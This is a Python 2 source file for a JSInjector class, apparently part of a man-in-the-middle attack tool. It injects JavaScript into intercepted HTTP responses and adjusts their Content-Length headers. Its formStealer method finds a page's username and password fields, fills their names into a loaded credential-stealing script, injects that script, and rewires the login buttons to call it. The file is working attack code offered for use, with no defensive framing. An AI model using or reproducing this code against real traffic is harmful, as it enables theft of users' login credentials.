from bs4 import BeautifulSoup
from Functions import Functions

class JSInjector:
    def __init__(self):
        self._tools = Functions()
        self._injectionPlaces = ["</head>", "<script ", "</body>", "<div>", "<title>", "<link rel", "<p ", "<br/>"]
        self._buttonTypes = ['type="button"', 'type="submit"']
        self._hasFormStealer = False

    def injectScriptIntoHeader(self, response, code_to_inject=""):
        header = self._tools.getHeader(response)
        oldresponse = response, 0
        injected_script = False

        # Try to inject code into the response body
        for ijplace in self._injectionPlaces:
            try:
                print "[*] Try to inject code in: " + str(ijplace)
                start = response.index(ijplace)
                response = response[:start] + code_to_inject + response[start:]
                injected_script = True
                print "[*] Code in front of " + str(ijplace) + " injected!"
                break
            except Exception:
                #print "[*] " + str(ijplace) + " failed! Next..."
                continue

        if not injected_script:
            print "[-] Failed to inject..."
            return oldresponse

        # Calculate the new length and change it in the header
        headernew, status = self._tools.changeContentlength(header, len(code_to_inject))

        # If both are true we are ready to change all in the response
        try:
            if status and injected_script:
                response = response.replace(header, headernew)
                print "[+] Injection done!"
                return response, 1
        except Exception:
            return oldresponse

        return oldresponse



    def formStealer(self, response):

        if self._hasFormStealer:
            return response

        oldresponse = response
        try:
            soup = BeautifulSoup(response, 'html.parser')
            txtinput = soup.findAll('input', {'type': 'text'})
            pwdinput = soup.findAll('input', {'type': 'password'})
        except Exception:
            return oldresponse

        username = ""
        password = ""

        # Get the name of the form

        try:
            for elem1 in txtinput:
                username = elem1['name']

            for elem2 in pwdinput:
                password = elem2['name']
        except Exception:
            return oldresponse


        if username is "" or password is "":
            return oldresponse


        #print response

        #Get formstealer script
        script = ""
        with open("JSInjector/formstealer.html", 'r') as f:
            script = f.readlines()

        if len(script) is 0:
            return oldresponse

        scriptSTR = ""
        for s in script:
            scriptSTR += s

        if scriptSTR is "":
            return oldresponse

        # Replace placeholder name with real formname
        scriptSTR = scriptSTR.replace("PLACEHOLDERUSERNAME", username)
        scriptSTR = scriptSTR.replace("PLACEHOLDERPASSWORD", password)

        #print scriptSTR

        response, status = self.injectScriptIntoHeader(response, scriptSTR)

        """
            After script injection was successfull we need to add an onclick event to the function.
            If the injection failed we dont need to add the onclick event
        """

        if status:
            print "[*] Adding onClick event"
            for b in self._buttonTypes:
                try:
                    start = response.index(b) + len(b) + 1
                    end = response.index("/>", start)
                    response = self._removeOnClickEvent(response, start, end)
                    response = str(response[:start]) + 'onclick="verifyLoginZ()" ' + str(response[start:])

                    print "[+] Added button event in: " + str(b)
                    self._hasFormStealer = True
                    return response
                except Exception:
                    continue

        return oldresponse


    def _removeOnClickEvent(self, response, start, end):
        button = response[start:end]
        if "onclick=" in button:
            print "[*] Previous onclick event found. Try to remove it"
            print "[*] " + str(button)
            ostart = button.index("onclick=")
            oend = button.index('"', ostart + len('onclick="'))
            on_click = button[ostart:oend+1]
            print "[*] " + str(on_click)
            button_new = button.replace(on_click, "")
            response = response.replace(button, button_new)
            print "[*] Removed"
            print "[*] " + str(button_new)
            print "[*] Need to substract the removed content length..."
            len_to_remove = len(on_click)
            response = self._tools.changeContentlength(response, -len_to_remove)

        return response